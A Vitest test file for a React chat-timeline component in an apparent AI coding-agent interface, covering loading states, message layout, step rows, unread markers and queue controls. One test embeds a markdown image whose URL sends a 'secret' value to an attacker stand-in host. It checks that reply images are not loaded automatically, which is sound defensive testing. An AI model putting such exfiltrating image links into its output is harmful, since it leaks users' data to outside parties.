// @vitest-environment jsdom

import {
  ATTACHMENT_MARKER,
  type Item,
  type TimelineTurn,
} from "@catamorphic/react";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  answerSentHere,
  ChatTimeline,
  type ChatTimelineProps,
  sentTime,
} from "./chat-timeline.js";
import {
  command,
  fileChange,
  input,
  notification,
  reply,
  timelineOf,
  toolCall,
  turn,
} from "./timeline-fixtures.js";

/**
 * The DOM the desktop and PWA end-to-end suites read. A change here
 * breaks those suites: change both together, deliberately.
 */
describe("ChatTimeline DOM contract", () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    Reflect.set(globalThis, "IS_REACT_ACT_ENVIRONMENT", true);
    vi.stubGlobal("requestAnimationFrame", (callback: FrameRequestCallback) =>
      window.setTimeout(() => callback(performance.now()), 0),
    );
    vi.stubGlobal("cancelAnimationFrame", (handle: number) =>
      window.clearTimeout(handle),
    );
    vi.stubGlobal("CSS", { escape: (value: string) => value });
    Object.defineProperty(HTMLElement.prototype, "scrollTo", {
      configurable: true,
      value: vi.fn(),
    });
    vi.stubGlobal(
      "ResizeObserver",
      class {
        observe() {}
        unobserve() {}
        disconnect() {}
      },
    );
    container = document.createElement("div");
    document.body.append(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
    Reflect.deleteProperty(HTMLElement.prototype, "scrollTo");
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
    Reflect.set(globalThis, "IS_REACT_ACT_ENVIRONMENT", false);
  });

  const render = (props: ChatTimelineProps) =>
    act(async () => root.render(<ChatTimeline {...props} />));
  const $ = <T extends Element = HTMLElement>(selector: string) =>
    container.querySelector<T>(selector);
  const $$ = (selector: string) => [...container.querySelectorAll(selector)];
  const now = Date.now();
  const iso = (offset: number) => new Date(now + offset).toISOString();

  it("replaces the empty prompt with initial loading, then an empty conversation or load error", async () => {
    const props = { timeline: [], emptyState: "Start a conversation" };
    await render({ ...props, isLoading: true });
    expect(
      $('[role="status"][aria-label="Loading conversation"]'),
    ).not.toBeNull();
    expect(container.textContent).not.toContain(props.emptyState);

    await render(props);
    expect($('[aria-label="Loading conversation"]')).toBeNull();
    expect(container.textContent).toContain(props.emptyState);

    await render({ ...props, error: "Could not load conversation" });
    expect($('[role="alert"]')?.textContent).toBe(
      "Could not load conversation",
    );
    expect(container.textContent).not.toContain(props.emptyState);
    expect($('[aria-label="Loading conversation"]')).toBeNull();
  });

  it("keeps loaded history visible during a refresh", async () => {
    await render({
      timeline: timelineOf({
        turns: [turn("t1", 1)],
        items: [input("t1", "Already loaded")],
      }),
      isLoading: true,
    });
    expect(container.textContent).toContain("Already loaded");
    expect($('[aria-label="Loading conversation"]')).toBeNull();
  });

  it("shows explicit connection status while reconnecting and resumes activity afterward", async () => {
    const props = {
      timeline: timelineOf({
        turns: [turn("t1", 1, { status: "running" })],
        items: [input("t1", "Keep this message")],
      }),
      activity: "Thinking",
    };
    await render({ ...props, isReconnecting: true });
    expect(container.textContent).toContain("Keep this message");
    expect($('[role="status"]')?.textContent).toBe(
      "Waiting for connection. Reconnecting…",
    );
    expect($('[role="alert"]')).toBeNull();
    expect($('[data-testid="chat-activity"]')).toBeNull();
    await render(props);
    expect($('[role="status"]')).toBeNull();
    expect($('[data-testid="chat-activity"]')?.textContent).toBe("Thinking");
  });

  const settledItems: Item[] = [
    input("t1", `Fix it with ${ATTACHMENT_MARKER}`, {
      attachments: [
        {
          kind: "image",
          name: "shot.png",
          mediaType: "image/png",
          dataBase64: "AAAA",
        },
      ],
    }),
    command("c1", "t1", {
      command: "bun test",
      description: "Run the tests",
      startedAt: iso(-5000),
      endedAt: iso(-2000),
    }),
    reply("n1", "t1", "Found it.\n\nThe parser drops empty input."),
    fileChange("f1", "t1", "src/parser.ts"),
    toolCall("b1", "t1", {
      tool: "run_background_command",
      input: { command: "bun run dev", description: "Start the dev server" },
    }),
    notification("w1", "t1", "Start the worker printed a line", {
      dispatch: "steer",
    }),
    reply("a1", "t1", "Fixed the parser."),
  ];

  it("reads person and agent messages by side, with prose and pills", async () => {
    await render({
      timeline: timelineOf({ turns: [turn("t1", 1)], items: settledItems }),
      focusMessageId: "a1",
    });
    const log = $('[role="log"]');
    expect(log).not.toBeNull();
    // The scroller, then the content column.
    const scroller = log?.querySelector(":scope > div");
    expect(scroller?.firstElementChild?.className).toContain(
      "flex min-h-full flex-col",
    );
    const sides = $$('[role="log"] article').map((article) =>
      article.className.includes("ml-auto") ? "You" : "Agent",
    );
    expect(sides).toEqual(["You", "Agent"]);
    const message = $("[data-user-message]");
    expect(message?.getAttribute("data-testid")).toBe("chat-user-message");
    expect(message?.textContent).toContain("Fix it with");
    const pill = message?.querySelector(
      '[data-testid="sent-pill"][data-pill-kind]',
    );
    expect(pill?.querySelector("img")).not.toBeNull();
    // Prose is the only Markdown without a test id; a note's detail has one.
    expect($("article .cat-markdown:not([data-testid])")?.textContent).toBe(
      "Fixed the parser.",
    );
    expect($('[data-message-id="a1"]')?.className).toContain("outline-accent");
    expect($('[data-message-id="a1"]')?.hasAttribute("data-answer")).toBe(true);
    // Every row's wrapper names its turn.
    expect($('[data-turn-id="t1"]')).not.toBeNull();
  });

  it("names an image in a reply instead of loading it, unless the host renders it", async () => {
    // An address in a reply is not the person's choice to contact it.
    const leak = "https://attacker.example/p.png?d=secret";
    const items = [
      input("t1", "Show me the chart"),
      reply("a1", "t1", `Here: ![the chart](${leak})`),
    ];
    await render({
      timeline: timelineOf({ turns: [turn("t1", 1)], items }),
    });
    expect($$("article img")).toEqual([]);
    expect($("article .cat-markdown")?.textContent).toBe("Here: the chart");
    const renderImage = vi.fn(({ alt }: { src: string; alt: string }) => (
      <button type="button">{`Show ${alt}`}</button>
    ));
    await render({
      timeline: timelineOf({ turns: [turn("t1", 1)], items }),
      renderImage,
    });
    expect(renderImage).toHaveBeenCalledWith({ src: leak, alt: "the chart" });
    expect($$("article img")).toEqual([]);
    expect($("article .cat-markdown button")?.textContent).toBe(
      "Show the chart",
    );
  });

  it("lets the host lead the person's message with its own element", async () => {
    await render({
      timeline: timelineOf({
        turns: [turn("t1", 1)],
        items: [
          input("t1", `Use the review skill: the parser ${ATTACHMENT_MARKER}`, {
            attachments: [
              {
                kind: "text",
                name: "notes.txt",
                text: "Notes",
                source: { type: "paste" },
              },
            ],
          }),
          reply("a1", "t1", "Reviewed."),
        ],
      }),
      presentUserMessage: (text) =>
        text.startsWith("Use the review skill: ")
          ? {
              lead: <span data-testid="lead">review</span>,
              text: text.slice("Use the review skill: ".length),
            }
          : undefined,
    });
    const message = $("[data-user-message]");
    expect(message?.querySelector('[data-testid="lead"]')?.textContent).toBe(
      "review",
    );
    expect(message?.textContent).not.toContain("Use the review skill");
    expect(message?.textContent).toContain("the parser");
    // The words keep their pills where they were.
    expect(message?.querySelector('[data-testid="sent-pill"]')).not.toBeNull();
  });

  it("says when the person sent a message, and nothing for a send not held yet", async () => {
    const Hint: NonNullable<ChatTimelineProps["Hint"]> = ({
      label,
      children,
    }) => <span data-hint={label}>{children}</span>;
    await render({
      timeline: timelineOf({ turns: [turn("t1", 1)], items: settledItems }),
      pending: [
        {
          commandId: "cmd-sending",
          text: "On its way",
          attachments: [],
          dispatch: "queue",
          status: "sending",
        },
        {
          commandId: "cmd-failed",
          text: "Never arrived",
          attachments: [],
          dispatch: "queue",
          status: "failed",
        },
      ],
      onRollback: () => undefined,
      Hint,
    });
    const sentAt = settledItems[0]?.createdAt ?? "";
    const time = $<HTMLTimeElement>(
      '[data-user-message]:not([data-pending-message]) [data-testid="chat-sent-time"]',
    );
    expect(time?.tagName).toBe("TIME");
    expect(time?.dateTime).toBe(sentAt);
    expect(time?.textContent).toBe(sentTime(sentAt)?.label);
    // The whole date and time is the hint on the time itself.
    expect(time?.querySelector("[data-hint]")?.getAttribute("data-hint")).toBe(
      sentTime(sentAt)?.full,
    );
    // Hidden until the message is hovered or focused.
    expect(time?.className).toContain("opacity-0");
    // In the row beside the message, with Restore to here.
    const side = $('[data-testid="chat-restore"]')?.closest("span.absolute");
    expect(side?.contains(time ?? null)).toBe(true);
    // A send not held yet, and one that failed, have no time of their own.
    expect($$("[data-pending-message]")).toHaveLength(2);
    expect($$("[data-pending-message] time")).toEqual([]);
  });

  it("keeps the steps' structure: toggle, rows, kinds, durations and details", async () => {
    await render({
      timeline: timelineOf({ turns: [turn("t1", 1)], items: settledItems }),
      backgroundCommands: [
        {
          kind: "command",
          command: "bun run dev",
          description: "Start the dev server",
          status: "finished",
          exitCode: 0,
        },
      ],
      onLinkClick: () => undefined,
    });
    const toggle = $('[data-testid="chat-turn-steps-toggle"]');
    expect($('[data-testid="chat-turn-steps"]')).not.toBeNull();
    expect(toggle?.getAttribute("aria-expanded")).toBe("false");
    expect(toggle?.closest("[inert]")).toBeNull();
    expect(
      $$('[data-testid="chat-step"]').map((step) =>
        step.getAttribute("data-step-kind"),
      ),
    ).toEqual(["command", "note", "file_edit", "background", "notification"]);
    const run = $$('[data-testid="chat-step"]')[0];
    const button = run?.querySelector("button");
    // Only its words and how long it took.
    expect(button?.textContent).toMatch(/^Run the tests\d+s$/);
    expect(run?.querySelector('[data-testid="chat-step-duration"]')).not.toBe(
      null,
    );
    expect(
      button?.parentElement?.querySelector('[data-testid="chat-step-detail"]'),
    ).not.toBeNull();
    expect(
      $(
        '[data-step-kind="note"] .cat-markdown[data-testid="chat-step-detail"]',
      ),
    ).not.toBeNull();
    expect($('[data-step-kind="note"]')?.getAttribute("data-message-id")).toBe(
      "n1",
    );
    expect(
      $('[data-step-kind="file_edit"]')?.getAttribute("data-file-path"),
    ).toBe("src/parser.ts");
    expect($('[data-testid="chat-background-status"]')?.textContent).toBe(
      "Ran command in background",
    );
    expect(
      $('[data-step-kind="notification"] [data-testid="chat-step-source"]'),
    ).not.toBeNull();
  });

  it("reads live work as an article whose running step is marked", async () => {
    vi.spyOn(Date, "now").mockReturnValue(now);
    await render({
      timeline: timelineOf({
        turns: [
          turn("t1", 1, {
            status: "running",
            completedAt: null,
            startedAt: iso(-10_000),
          }),
        ],
        items: [
          input("t1", "Run it"),
          command("c1", "t1", {
            command: "bun test",
            status: "in_progress",
            startedAt: iso(-3000),
            endedAt: null,
          }),
        ],
      }),
      activity: "Running tests",
    });
    const live = $("article[data-live-work]");
    expect(live?.className).not.toContain("ml-auto");
    expect(
      live?.querySelector('[data-testid="chat-step"][data-running]'),
    ).not.toBeNull();
    // While the turn runs, its lone step keeps its line, which carries the
    // turn's clock.
    const toggle = live?.querySelector(
      '[data-testid="chat-turn-steps-toggle"]',
    );
    expect(toggle?.closest("[inert]")).toBeNull();
    expect(toggle?.textContent).toBe("1 step");
    expect(
      live?.querySelector(
        '[role="timer"] [data-testid="chat-activity-elapsed"]',
      )?.textContent,
    ).toBe("10s");
    // The activity line is its spinner and its words, nothing beside them.
    expect($('[data-testid="activity-text"]')?.textContent).toBe(
      "Running tests",
    );
    expect(
      [...($('[data-testid="chat-activity"]')?.children ?? [])].map(
        (child) => child.getAttribute("data-testid") ?? child.tagName,
      ),
    ).toEqual(["svg", "activity-text"]);
  });

  it("closes turns with their outcome", async () => {
    const timeline: TimelineTurn[] = [
      ...timelineOf({
        turns: [
          turn("t1", 1, { status: "interrupted" }),
          turn("t2", 2, {
            status: "queued",
            retryAt: iso(30_000),
            error: { message: "Rate limited" },
          }),
          turn("t3", 3, {
            status: "failed",
            error: { message: "Sign in again.", kind: "auth" },
          }),
        ],
        items: [input("t1", "one"), input("t2", "two"), input("t3", "three")],
      }),
      {
        key: "q",
        turn: null,
        entries: [
          {
            kind: "answer",
            id: "q1",
            requestId: "q1",
            questions: [
              {
                question: "Which?",
                header: "Which",
                multiSelect: false,
                options: [],
              },
            ],
            answers: ["This one"],
            attachments: [[]],
            dismissed: false,
          },
        ],
      },
    ];
    await render({
      timeline,
      onRetry: () => undefined,
      onReauth: () => undefined,
      onInterrupt: () => undefined,
    });
    expect(
      $$('[role="log"] .italic').some(
        (element) =>
          element.tagName === "DIV" && element.textContent === "Interrupted",
      ),
    ).toBe(true);
    expect($('[data-testid="chat-interrupted"]')).not.toBeNull();
    expect($$('[data-testid="chat-error-card"]')).toHaveLength(2);
    expect($('[data-testid="chat-auto-retry"]')).not.toBeNull();
    expect($('[data-testid="chat-reauth"]')).not.toBeNull();
    expect($('[data-testid="chat-retry"]')).not.toBeNull();
    const answer = $('[data-testid="question-answer"]');
    expect(answer?.tagName).toBe("ARTICLE");
    expect(answer?.className).toContain("ml-auto");
  });

  it("enters an answer once: the session's message for it does not fade in again", async () => {
    const answer = (id: string) => ({
      kind: "answer" as const,
      id,
      requestId: "asked-once",
      questions: [
        {
          question: "Which?",
          header: "Which",
          multiSelect: false,
          options: [],
        },
      ],
      answers: ["Grid"],
      attachments: [[]],
      dismissed: false,
    });
    const at = (id: string): TimelineTurn[] => [
      { key: "t1", turn: turn("t1", 1), entries: [answer(id)] },
    ];
    // Sent: it shows where its question stood, rising in.
    await render({ timeline: at("request-item") });
    const sentCard = $('[data-testid="question-answer"]');
    expect(sentCard?.dataset.messageId).toBe("request-item");
    expect(sentCard?.className).toContain("motion-safe:opacity-0");
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 20));
    });
    expect(sentCard?.className).toContain("motion-safe:opacity-100");
    // The session records it as a message: the same answer, already in.
    await render({ timeline: at("answer-message") });
    const recorded = $('[data-testid="question-answer"]');
    expect(recorded?.dataset.messageId).toBe("answer-message");
    expect(recorded?.className).toContain("motion-safe:opacity-100");
    expect(recorded?.className).not.toContain("motion-safe:opacity-0");
  });

  it("shows an answer sent from this window where its question stood, without rising in", async () => {
    answerSentHere("sent-here");
    await render({
      timeline: [
        {
          key: "t1",
          turn: turn("t1", 1),
          entries: [
            {
              kind: "answer",
              id: "request-item",
              requestId: "sent-here",
              questions: [],
              answers: ["Grid"],
              attachments: [[]],
              dismissed: false,
            },
          ],
        },
      ],
    });
    expect($('[data-testid="question-answer"]')?.className).toContain(
      "motion-safe:opacity-100",
    );
  });

  /** What the unread line says, or is about to: its label swaps in place. */
  const unreadState = (messageId: string) => {
    const label = $(
      `[data-message-id="${messageId}"] [data-testid="chat-unread-state"]`,
    );
    return (
      label?.querySelector(".cat-swap-next")?.getAttribute("data-text") ??
      label?.textContent
    );
  };

  it("marks a message sent while the agent works until it is read, and interrupts for it", async () => {
    const steerNow = vi.fn(() => true);
    const working = turn("t1", 1, {
      status: "running",
      completedAt: null,
    });
    const sent = input("t1", "Use the blue one", {
      id: "s1",
      dispatch: "steer",
      status: "in_progress",
    });
    const also = input("t1", "And the footer", {
      id: "s2",
      dispatch: "steer",
      status: "in_progress",
    });
    const items: Item[] = [
      input("t1", "Build the page"),
      command("c1", "t1", { command: "bun test" }),
      sent,
      also,
    ];
    await render({
      timeline: timelineOf({ turns: [working], items }),
      activity: "Working",
      onSteerNow: steerNow,
    });
    const line = $('[data-message-id="s1"] [data-testid="chat-unread-line"]');
    expect(line?.hasAttribute("data-unread")).toBe(true);
    expect(unreadState("s1")).toBe("Not read yet");
    await act(async () =>
      line
        ?.querySelector<HTMLButtonElement>('[data-testid="chat-steer-now"]')
        ?.click(),
    );
    expect(steerNow).toHaveBeenCalledWith("s1");
    // Every message the turn had not read is read with it.
    expect(unreadState("s1")).toBe("Stopping to read it");
    expect(unreadState("s2")).toBe("Stopping to read it");
    for (const id of ["s1", "s2"])
      expect(
        $(`[data-message-id="${id}"] [data-testid="chat-steer-now"]`)?.closest(
          "[inert]",
        ),
      ).not.toBeNull();
    // Read: the line closes, and nothing is offered on it anymore.
    await render({
      timeline: timelineOf({
        turns: [working],
        items: [
          ...items.slice(0, 2),
          { ...sent, status: "completed" },
          { ...also, status: "completed" },
        ],
      }),
      activity: "Working",
      onSteerNow: steerNow,
    });
    expect(
      $(
        '[data-message-id="s1"] [data-testid="chat-unread-line"]',
      )?.hasAttribute("data-unread"),
    ).toBe(false);
    // The turn's own input was never unread.
    expect(
      $(
        '[data-message-id="t1:input"] [data-testid="chat-unread-line"]',
      )?.hasAttribute("data-unread"),
    ).toBe(false);
  });

  it("offers Interrupt only while the turn works, and says when it did not work", async () => {
    const sent = input("t1", "Use the blue one", {
      id: "s1",
      dispatch: "steer",
      status: "in_progress",
    });
    const items: Item[] = [input("t1", "Build the page"), sent];
    const offered = () =>
      $('[data-message-id="s1"] [data-testid="chat-steer-now"]')?.closest(
        "[inert]",
      ) === null;
    for (const working of [
      turn("t1", 1, { status: "preparing", completedAt: null }),
      turn("t1", 1, {
        status: "running",
        completedAt: null,
        cancellationRequested: true,
      }),
    ]) {
      await render({
        timeline: timelineOf({ turns: [working], items }),
        activity: "Working",
        onSteerNow: () => true,
      });
      expect(offered()).toBe(false);
    }
    const refused = vi.fn(() => false);
    await render({
      timeline: timelineOf({
        turns: [turn("t1", 1, { status: "running", completedAt: null })],
        items,
      }),
      activity: "Working",
      onSteerNow: refused,
    });
    expect(offered()).toBe(true);
    await act(async () =>
      $<HTMLButtonElement>(
        '[data-message-id="s1"] [data-testid="chat-steer-now"]',
      )?.click(),
    );
    expect(refused).toHaveBeenCalled();
    expect($('[data-message-id="s1"] [role="alert"]')?.textContent).toBe(
      "Could not interrupt. Try again.",
    );
    expect(offered()).toBe(true);
    expect(unreadState("s1")).toBe("Not read yet");
  });

  it("keeps a send's bubble as the session takes it, unread throughout when it steers", async () => {
    const working = turn("t1", 1, { status: "running", completedAt: null });
    const base: Item[] = [input("t1", "Build the page")];
    const pending = {
      commandId: "cmd-1",
      text: "Use the blue one",
      attachments: [],
      dispatch: "steer" as const,
      status: "sent" as const,
    };
    await render({
      timeline: timelineOf({ turns: [working], items: base }),
      pending: [pending],
      activity: "Working",
    });
    const bubble = $('[data-pending-message="sent"]');
    expect(
      bubble
        ?.querySelector('[data-testid="chat-unread-line"]')
        ?.hasAttribute("data-unread"),
    ).toBe(true);
    await render({
      timeline: timelineOf({
        turns: [working],
        items: [
          ...base,
          input("t1", "Use the blue one", {
            id: "s1",
            dispatch: "steer",
            status: "in_progress",
            idempotencyKey: "user:me:cmd-1",
          }),
        ],
      }),
      pending: [pending],
      activity: "Working",
    });
    // The same element, still unread: nothing flickers as it changes hands.
    const message = $('[data-message-id="s1"]');
    expect(message).toBe(bubble);
    expect(
      message
        ?.querySelector('[data-testid="chat-unread-line"]')
        ?.hasAttribute("data-unread"),
    ).toBe(true);
    // A send that queues is never unread.
    await render({
      timeline: timelineOf({ turns: [working], items: base }),
      pending: [{ ...pending, commandId: "cmd-2", dispatch: "queue" }],
      activity: "Working",
    });
    expect(
      $(
        '[data-pending-message="sent"] [data-testid="chat-unread-line"]',
      )?.hasAttribute("data-unread"),
    ).toBe(false);
  });

  it("keeps the queue's controls", async () => {
    await render({
      timeline: [],
      activity: "Working",
      queue: [
        {
          turn: turn("q1", 2, { status: "queued", attemptCount: 0 }),
          item: input("q1", "wrong words"),
          joined: [],
        },
      ],
      onEditQueued: () => false,
      onCancelQueued: () => true,
      onSendQueuedNow: () => true,
      onHoldQueued: () => true,
    });
    const queued = $('[data-testid="chat-queued-message"]');
    expect(
      queued?.querySelector('[data-testid="chat-queued-delete"]'),
    ).not.toBe(null);
    expect(
      queued?.querySelector('[data-testid="chat-queued-send-now"]'),
    ).not.toBeNull();
    await act(async () =>
      queued
        ?.querySelector<HTMLButtonElement>('[aria-label="Edit queued message"]')
        ?.click(),
    );
    const editor = $<HTMLTextAreaElement>('[data-testid="chat-queued-edit"]');
    expect(editor?.getAttribute("aria-label")).toBe("Edit queued message");
    await act(async () => {
      if (!editor) return;
      Object.getOwnPropertyDescriptor(
        HTMLTextAreaElement.prototype,
        "value",
      )?.set?.call(editor, "right words");
      editor.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => {
      editor?.dispatchEvent(
        new KeyboardEvent("keydown", { key: "Enter", bubbles: true }),
      );
    });
    // A refused edit keeps the editor and says so.
    expect(queued?.querySelector('[role="alert"]')).not.toBeNull();
  });
});
